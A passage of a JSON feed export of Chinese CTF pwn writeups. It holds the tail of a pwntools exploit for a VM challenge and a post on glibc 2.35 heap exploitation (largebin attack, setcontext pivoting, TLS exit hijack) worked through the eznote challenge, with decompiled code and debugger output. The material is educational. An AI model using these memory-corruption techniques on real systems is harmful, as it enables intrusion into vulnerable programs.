class=\"number\">1</span>)</span><br><span class=\"line\">add()</span><br><span class=\"line\">pop(<span class=\"number\">2</span>)</span><br><span class=\"line\">mov_m_r(<span class=\"number\">2</span>,pos_offset)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#change the tls_dtor_list</span></span><br><span class=\"line\">push(<span class=\"number\">0</span>)</span><br><span class=\"line\">mov_r_i(<span class=\"number\">1</span>,heap_offset-<span class=\"number\">0x100</span>)</span><br><span class=\"line\">push(<span class=\"number\">1</span>)</span><br><span class=\"line\">sub()</span><br><span class=\"line\">pop(<span class=\"number\">2</span>)</span><br><span class=\"line\">mov_m_r(<span class=\"number\">2</span>,tls_dtor_list_heap_offset+<span class=\"number\">0x20</span>)\t<span class=\"comment\">#list = heap_address</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">push(<span class=\"number\">4</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(r,&#x27;b exit&#x27;)</span></span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(<span class=\"built_in\">len</span>(code)))</span><br><span class=\"line\">r.sendlineafter(<span class=\"string\">&quot;continue&quot;</span>,<span class=\"string\">&#x27;&#x27;</span>)</span><br><span class=\"line\">r.sendlineafter(<span class=\"string\">&quot;Please input your code size:&quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">0x1f0</span>))</span><br><span class=\"line\">r.sendlineafter(<span class=\"string\">&quot;Please input your memory count:&quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">0x6000000000008000</span>))</span><br><span class=\"line\">r.sendlineafter(<span class=\"string\">&quot;Please input your code:&quot;</span>,code)</span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n",
            "tags": [
                "writeup"
            ]
        },
        {
            "id": "http://example.com/2022/08/01/glibc-2-35%E4%B8%80%E4%BA%9B%E6%89%8B%E6%B3%95/",
            "url": "http://example.com/2022/08/01/glibc-2-35%E4%B8%80%E4%BA%9B%E6%89%8B%E6%B3%95/",
            "title": "glibc-2.35一些手法",
            "date_published": "2022-08-01T08:24:13.000Z",
            "content_html": "<h1 id=\"glibc-235-ubuntu3-下的利用手法\"><a class=\"markdownIt-Anchor\" href=\"#glibc-235-ubuntu3-下的利用手法\">#</a> glibc 2.35 ubuntu3 下的利用手法。</h1>\n<p>原本我们以为 2.35 的时代不会来的这么快，但是最近 DS360ctf，以及强网杯几道题目的出现让 glibc 的 pwn 生存条件急剧下降。</p>\n<p>首先我们谈谈为什么很多师傅都人为 2.35 的堆 pwn 是一个寒冬：</p>\n<h2 id=\"现状\"><a class=\"markdownIt-Anchor\" href=\"#现状\">#</a> 现状：</h2>\n<p>之所以这样讲，一部分原因在于由于高版本的 glibc 的安全特性，封锁掉了很多的后门，特别是几个重要的 hook 不再是我们可以利用的了。但是这并不是让题目更难，觉得反而是解题出现严重的两级分化，一部分师傅研究过几个手法，几乎就可以做到一口气解决，因为利用的手法比较单一，就那么几种，即便是先提出的手法，其实原理也是大同小异。而对于不了解的师傅，就会陷入深渊，没有后门，或者自己习惯的后门都被堵上了，怎么走。</p>\n<p>我们发现，其实大部分的情况都都是因为 hook 被禁止。而最近出现的手法，就要求我们要继续挖掘 io 的利用链。</p>\n<p>所以这次我就要花费一些时间整理一部分。主要还是基于目前出现的一些题目的复现。</p>\n<p>** 在 35 时代，我们必须学会 largebinattack</p>\n<p>目前计划着是有</p>\n<ul>\n<li>house of apple 1</li>\n<li>house of apple 2</li>\n<li>house of apple 3</li>\n<li>house of cat</li>\n<li>house of emma</li>\n<li>house of banana</li>\n<li>tls 劫持</li>\n</ul>\n<h2 id=\"一些小总结\"><a class=\"markdownIt-Anchor\" href=\"#一些小总结\">#</a> 一些小总结：</h2>\n<p>目前遇到的 2.35 的题目都是基于同一个版本</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dreamcat@dreamcat-virtual-machine:~/Desktop/360dsctf/eznote$ strings libc.so.6 |grep ubuntu</span><br><span class=\"line\">GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3) stable release version 2.35.</span><br><span class=\"line\">&lt;https://bugs.launchpad.net/ubuntu/+<span class=\"built_in\">source</span>/glibc/+bugs&gt;.</span><br></pre></td></tr></table></figure>\n<h2 id=\"largebinattack\"><a class=\"markdownIt-Anchor\" href=\"#largebinattack\">#</a> largebinattack</h2>\n<p>关键代码</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">else</span></span><br><span class=\"line\">           &#123;</span><br><span class=\"line\">             victim_index = largebin_index (size);                               <span class=\"comment\">//largebins</span></span><br><span class=\"line\">             bck = bin_at (av, victim_index);</span><br><span class=\"line\">             fwd = bck-&gt;fd;</span><br><span class=\"line\"></span><br><span class=\"line\">             <span class=\"comment\">/* maintain large bins in sorted order */</span></span><br><span class=\"line\">             <span class=\"keyword\">if</span> (fwd != bck)</span><br><span class=\"line\">               &#123;</span><br><span class=\"line\">                 <span class=\"comment\">/* Or with inuse bit to speed comparisons */</span></span><br><span class=\"line\">                 size |= PREV_INUSE;</span><br><span class=\"line\">                 <span class=\"comment\">/* if smaller than smallest, bypass loop below */</span></span><br><span class=\"line\">                 assert (chunk_main_arena (bck-&gt;bk));</span><br><span class=\"line\">                 <span class=\"keyword\">if</span> ((<span class=\"type\">unsigned</span> <span class=\"type\">long</span>) (size)</span><br><span class=\"line\">\t      &lt; (<span class=\"type\">unsigned</span> <span class=\"type\">long</span>) chunksize_nomask (bck-&gt;bk))</span><br><span class=\"line\">                   &#123;</span><br><span class=\"line\">                     fwd = bck;</span><br><span class=\"line\">                     bck = bck-&gt;bk;</span><br><span class=\"line\"></span><br><span class=\"line\">                     victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class=\"line\">                     victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class=\"line\">                     fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class=\"line\">                   &#125;</span><br><span class=\"line\">                 <span class=\"keyword\">else</span></span><br><span class=\"line\">                   &#123;</span><br><span class=\"line\">                     assert (chunk_main_arena (fwd));</span><br><span class=\"line\">                     <span class=\"keyword\">while</span> ((<span class=\"type\">unsigned</span> <span class=\"type\">long</span>) size &lt; chunksize_nomask (fwd))</span><br><span class=\"line\">                       &#123;</span><br><span class=\"line\">                         fwd = fwd-&gt;fd_nextsize;</span><br><span class=\"line\">\t\t  assert (chunk_main_arena (fwd));</span><br><span class=\"line\">                       &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                     <span class=\"keyword\">if</span> ((<span class=\"type\">unsigned</span> <span class=\"type\">long</span>) size</span><br><span class=\"line\">\t\t  == (<span class=\"type\">unsigned</span> <span class=\"type\">long</span>) chunksize_nomask (fwd))</span><br><span class=\"line\">                       <span class=\"comment\">/* Always insert in the second position.  */</span></span><br><span class=\"line\">                       fwd = fwd-&gt;fd;</span><br><span class=\"line\">                     <span class=\"keyword\">else</span></span><br><span class=\"line\">                       &#123;</span><br><span class=\"line\">                         victim-&gt;fd_nextsize = fwd;</span><br><span class=\"line\">                         victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class=\"line\">                         <span class=\"keyword\">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))                        <span class=\"comment\">//相比于2.29新增加的判断</span></span><br><span class=\"line\">                           malloc_printerr (<span class=\"string\">&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;</span>);</span><br><span class=\"line\">                         fwd-&gt;bk_nextsize = victim;</span><br><span class=\"line\">                         victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class=\"line\">                       &#125;</span><br><span class=\"line\">                     bck = fwd-&gt;bk;</span><br><span class=\"line\">                     <span class=\"keyword\">if</span> (bck-&gt;fd != fwd)                               <span class=\"comment\">////相比于2.29新增加的判断</span></span><br><span class=\"line\">                       malloc_printerr (<span class=\"string\">&quot;malloc(): largebin double linked list corrupted (bk)&quot;</span>);</span><br><span class=\"line\">                   &#125;</span><br><span class=\"line\">               &#125;</span><br><span class=\"line\">             <span class=\"keyword\">else</span></span><br><span class=\"line\">               victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class=\"line\">           &#125;</span><br></pre></td></tr></table></figure>\n<p>相比于 2.29，新增加了两个检查。因为这些检查的原因，我们只有插入小 size 额可以实现 attack,</p>\n<h3 id=\"要求\"><a class=\"markdownIt-Anchor\" href=\"#要求\">#</a> 要求</h3>\n<ol>\n<li>对应的 bin 中只有一个 free_chunk,（此时 fd_nextsize,bk_nextsize 都指向自己）</li>\n<li>修改 free_chunk 的 bk_nextsize 为目标地址减去 0x20.</li>\n</ol>\n<h2 id=\"setcontext\"><a class=\"markdownIt-Anchor\" href=\"#setcontext\">#</a> setcontext</h2>\n<p>在新的版本中，setcontext 不再是直接使用 rdi，而是使用 rdx 进行参数的一些设置。所以需要一些手段在 setcontext 之前，能够设置 rdx 为可控制的堆空间。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">  0x7f2c07abea6d &lt;setcontext+61&gt;     mov    rsp, qword ptr [rdx + 0xa0]</span><br><span class=\"line\">► 0x7f2c07abea74 &lt;setcontext+68&gt;     mov    rbx, qword ptr [rdx + 0x80]</span><br><span class=\"line\">  0x7f2c07abea7b &lt;setcontext+75&gt;     mov    rbp, qword ptr [rdx + 0x78]</span><br><span class=\"line\">  0x7f2c07abea7f &lt;setcontext+79&gt;     mov    r12, qword ptr [rdx + 0x48]</span><br><span class=\"line\">  0x7f2c07abea83 &lt;setcontext+83&gt;     mov    r13, qword ptr [rdx + 0x50]</span><br><span class=\"line\">  0x7f2c07abea87 &lt;setcontext+87&gt;     mov    r14, qword ptr [rdx + 0x58]</span><br><span class=\"line\">  0x7f2c07abea8b &lt;setcontext+91&gt;     mov    r15, qword ptr [rdx + 0x60]</span><br><span class=\"line\">  0x7f2c07abea8f &lt;setcontext+95&gt;     test   dword ptr fs:[0x48], 2</span><br><span class=\"line\">  0x7f2c07abea9b &lt;setcontext+107&gt;    je     setcontext+294                &lt;setcontext+294&gt;</span><br><span class=\"line\">   ↓</span><br><span class=\"line\">  0x7f2c07abeb56 &lt;setcontext+294&gt;    mov    rcx, qword ptr [rdx + 0xa8]</span><br><span class=\"line\">  0x7f2c07abeb5d &lt;setcontext+301&gt;    push   rcx</span><br><span class=\"line\">  0x7f2c07abeb5e &lt;setcontext+302&gt;\tmov    rsi,QWORD PTR [rdx+0x70]</span><br><span class=\"line\">  0x7f2c07abeb62 &lt;setcontext+306&gt;:\tmov    rdi,QWORD PTR [rdx+0x68]</span><br><span class=\"line\">  0x7f2c07abeb66 &lt;setcontext+310&gt;:\tmov    rcx,QWORD PTR [rdx+0x98]</span><br><span class=\"line\">  0x7f2c07abeb6d &lt;setcontext+317&gt;:\tmov    r8,QWORD PTR [rdx+0x28]</span><br><span class=\"line\">  0x7f2c07abeb71 &lt;setcontext+321&gt;:\tmov    r9,QWORD PTR [rdx+0x30]</span><br><span class=\"line\">  0x7f2c07abeb75 &lt;setcontext+325&gt;:\tmov    rdx,QWORD PTR [rdx+0x88]</span><br><span class=\"line\">  0x7f2c07abeb7c &lt;setcontext+332&gt;:\txor    eax,eax</span><br><span class=\"line\">  0x7f2c07abeb7e &lt;setcontext+334&gt;:\tret </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>rdx 我们提前布置为我们可以控制的堆上，保证 rbp 大于、等于 rsp。除了 rcx，其他寄存器直接设置为 0，这里单独提出来 rcx，是因为 setcontext 最后 ret 的时候相当于，mov rip,[rsp]。加一个 ret 后，就可以劫持程序栈 rip.</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> RBP  <span class=\"number\">0x563dfde0ada0</span> —▸ <span class=\"number\">0x7f3391d8b3e5</span> (iconv+<span class=\"number\">197</span>) ◂— pop    rdi</span><br><span class=\"line\"> RSP  <span class=\"number\">0x563dfde0ad98</span> —▸ <span class=\"number\">0x7f3391db4b52</span> (setcontext+<span class=\"number\">290</span>) ◂— ret    </span><br><span class=\"line\">*RIP  <span class=\"number\">0x7f3391db4b7e</span> (setcontext+<span class=\"number\">334</span>) ◂— ret    </span><br><span class=\"line\">───────────────────────────────────[ DISASM ]───────────────────────────────────</span><br><span class=\"line\">   <span class=\"number\">0x7f3391db4b66</span> &lt;setcontext+<span class=\"number\">310</span>&gt;    mov    rcx, qword ptr [rdx + <span class=\"number\">0x98</span>]</span><br><span class=\"line\">   <span class=\"number\">0x7f3391db4b6d</span> &lt;setcontext+<span class=\"number\">317</span>&gt;    mov    r8, qword ptr [rdx + <span class=\"number\">0x28</span>]</span><br><span class=\"line\">   <span class=\"number\">0x7f3391db4b71</span> &lt;setcontext+<span class=\"number\">321</span>&gt;    mov    r9, qword ptr [rdx + <span class=\"number\">0x30</span>]</span><br><span class=\"line\">   <span class=\"number\">0x7f3391db4b75</span> &lt;setcontext+<span class=\"number\">325</span>&gt;    mov    rdx, qword ptr [rdx + <span class=\"number\">0x88</span>]</span><br><span class=\"line\">   <span class=\"number\">0x7f3391db4b7c</span> &lt;setcontext+<span class=\"number\">332</span>&gt;    xor    eax, eax</span><br><span class=\"line\"> ► <span class=\"number\">0x7f3391db4b7e</span> &lt;setcontext+<span class=\"number\">334</span>&gt;    ret </span><br></pre></td></tr></table></figure>\n<p>我们的 rbp 设置为 rop 的开始而不是在下一条。但是我还没有搞清楚是否可以用 leave;ret; 浅尝了一下，不可以</p>\n<h2 id=\"tls劫持exit执行流\"><a class=\"markdownIt-Anchor\" href=\"#tls劫持exit执行流\">#</a> tls 劫持 exit 执行流</h2>\n<h3 id=\"前提条件\"><a class=\"markdownIt-Anchor\" href=\"#前提条件\">#</a> 前提条件</h3>\n<ul>\n<li>任意地址写一个堆地址，</li>\n<li>泄露出 heap 地址，libc 地址</li>\n<li>我们可以改写一个 chunk 的头部信息，prev_size,size。</li>\n<li>程序可以执行 exit（这里我们仅仅测试了 main 函数直接 retutrn, 显式调用 exit 应该也可以，或者报错）</li>\n</ul>\n<h3 id=\"这里我们以360dsctf的eznote为例题\"><a class=\"markdownIt-Anchor\" href=\"#这里我们以360dsctf的eznote为例题\">#</a> 这里我们以 360dsctf 的 eznote 为例题，</h3>\n<p>程序实现了基本的增删改查，程序初始化的时候，申请了一个 chunk 用作一个指针数组，用于储存我们申请的 note.</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">unsigned</span> __int64 <span class=\"title function_\">init_0</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v1; <span class=\"comment\">// [rsp+8h] [rbp-10h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v1 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  setbuf(<span class=\"built_in\">stdin</span>, <span class=\"number\">0LL</span>);</span><br><span class=\"line\">  setbuf(<span class=\"built_in\">stdout</span>, <span class=\"number\">0LL</span>);</span><br><span class=\"line\">  setbuf(<span class=\"built_in\">stderr</span>, <span class=\"number\">0LL</span>);</span><br><span class=\"line\">  alarm(<span class=\"number\">0x78</span>u);</span><br><span class=\"line\">  gp = (global_list *)<span class=\"built_in\">calloc</span>(<span class=\"number\">7uLL</span>, <span class=\"number\">0x18</span>uLL);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> __readfsqword(<span class=\"number\">0x28</span>u) ^ v1;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这里储存的结构体的大小为 0x18 字节，gp 一共申请了 7 个。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">00000000</span> note            struc ; (<span class=\"keyword\">sizeof</span>=<span class=\"number\">0x18</span>, mappedto_15)</span><br><span class=\"line\"><span class=\"number\">00000000</span>                                         ; XREF: global_list/r</span><br><span class=\"line\"><span class=\"number\">00000000</span> size            dq ?                    ; XREF: add+<span class=\"number\">28</span>/r</span><br><span class=\"line\"><span class=\"number\">00000008</span> ptr             dq ?                    ; offset</span><br><span class=\"line\"><span class=\"number\">00000010</span> real_size       dq ?</span><br><span class=\"line\"><span class=\"number\">00000018</span> note            ends</span><br><span class=\"line\"><span class=\"number\">00000018</span></span><br></pre></td></tr></table></figure>\n<p>size 是我们在申请 chunk 的时候提供的，real_size 是我们输入的数据的长度。</p>\n<p>问题出在 add 的时候，同时存在的 note 的数量判断。这里值判断是否大于 7，所以我们申请第 8 个的时候，可以通过检查，那么就造成了数组的御姐，数组储存在 chunk 中，势必会影响下一个 chunk 的头部数据。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">add</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  __int64 count; <span class=\"comment\">// rbp</span></span><br><span class=\"line\">  __int64 v1; <span class=\"comment\">// rbx</span></span><br><span class=\"line\">  __int64 size; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  __int64 v3; <span class=\"comment\">// r12</span></span><br><span class=\"line\">  <span class=\"type\">char</span> *ptr; <span class=\"comment\">// r13</span></span><br><span class=\"line\">  <span class=\"type\">char</span> *real_size; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  note *v6; <span class=\"comment\">// rbx</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> __int64)nums &gt; <span class=\"number\">7</span> )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Too many notes.&quot;</span>);</span><br><span class=\"line\">  count = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  v1 = <span class=\"number\">1LL</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( gp-&gt;<span class=\"built_in\">list</span>[<span class=\"number\">0</span>].ptr )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">while</span> ( <span class=\"number\">1</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      ++count;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( !gp-&gt;<span class=\"built_in\">list</span>[v1].ptr || count == <span class=\"number\">7</span> )</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      ++v1;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    v1 = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  __printf_chk(<span class=\"number\">1LL</span>, <span class=\"string\">&quot;Size: &quot;</span>);</span><br><span class=\"line\">  size = getnum();</span><br><span class=\"line\">  v3 = size;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( size &lt;= <span class=\"number\">0x3FF</span> )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Invalid size.&quot;</span>);</span><br><span class=\"line\">  ptr = (<span class=\"type\">char</span> *)<span class=\"built_in\">calloc</span>(size, <span class=\"number\">1uLL</span>);</span><br><span class=\"line\">  __printf_chk(<span class=\"number\">1LL</span>, <span class=\"string\">&quot;Content: &quot;</span>);</span><br><span class=\"line\">  real_size = read_n(<span class=\"number\">0</span>, ptr, v3);</span><br><span class=\"line\">  v6 = &amp;gp-&gt;<span class=\"built_in\">list</span>[v1];</span><br><span class=\"line\">  v6-&gt;size = v3;</span><br><span class=\"line\">  ++nums;</span><br><span class=\"line\">  v6-&gt;ptr = ptr;</span><br><span class=\"line\">  v6-&gt;real_size = (__int64)real_size;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> __printf_chk(<span class=\"number\">1LL</span>, <span class=\"string\">&quot;Note%lu saved.\\n&quot;</span>, count);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>数组最小限制为 0x400, 没有上限，所以我们可以尽情的构造较大的 chunk。</p>\n<p>观察到，数组溢出时候的情况。因为我们申请 gp 数组的堆块大小只有 0xb0, 实际使用空间只有 0xa8, 那么，我们申请的 7 个结构体恰好可以沾满，那么第 8 个结构体的 size 就会占据下一个 chunk 的头部，修改 chunk_size。如果我们前面的 chunk 申请的比较小，第八个申请的很大，就会导致第一个 chunk 的 size 被更改，实现 overlap。</p>\n<p>主义的时，一旦 8 号 chunk 申请处理啊，就无法 free。</p>\n<p>泄露地址。</p>\n<p>在向 note 中读入数据的时候，会自动补全空字符。输出使用格式化字符串，只是 add 时使用了 calloc，初始化 chunk。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">char</span> *__fastcall <span class=\"title function_\">read_n</span><span class=\"params\">(<span class=\"type\">int</span> fd, <span class=\"type\">char</span> *ptr, __int64 size)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">char</span> *v3; <span class=\"comment\">// r14</span></span><br><span class=\"line\">  <span class=\"type\">char</span> *pos; <span class=\"comment\">// r15</span></span><br><span class=\"line\">  __int64 v5; <span class=\"comment\">// rbx</span></span><br><span class=\"line\">  <span class=\"type\">char</span> *end; <span class=\"comment\">// r13</span></span><br><span class=\"line\">  __int64 v7; <span class=\"comment\">// rsi</span></span><br><span class=\"line\">  <span class=\"type\">char</span> buf; <span class=\"comment\">// [rsp+17h] [rbp-41h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v11; <span class=\"comment\">// [rsp+18h] [rbp-40h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v3 = ptr;</span><br><span class=\"line\">  v11 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  buf = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( size )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    pos = ptr;</span><br><span class=\"line\">    v5 = <span class=\"number\">1LL</span> - (_QWORD)ptr;</span><br><span class=\"line\">    end = &amp;ptr[size];</span><br><span class=\"line\">    <span class=\"keyword\">while</span> ( <span class=\"number\">1</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      v7 = (__int64)&amp;pos[v5];</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( read(fd, &amp;buf, <span class=\"number\">1uLL</span>) &lt;= <span class=\"number\">0</span> || buf == <span class=\"number\">10</span> )</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      *pos++ = buf;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( pos == end )</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> LABEL_8;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    *pos = <span class=\"number\">0</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">LABEL_8:</span><br><span class=\"line\">    v3[size - <span class=\"number\">1</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">    v7 = size;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> (<span class=\"type\">char</span> *)v7;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>修改掉第一个 notechunk 的 size 后，直接将其 free，就会将第二个覆盖到</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span 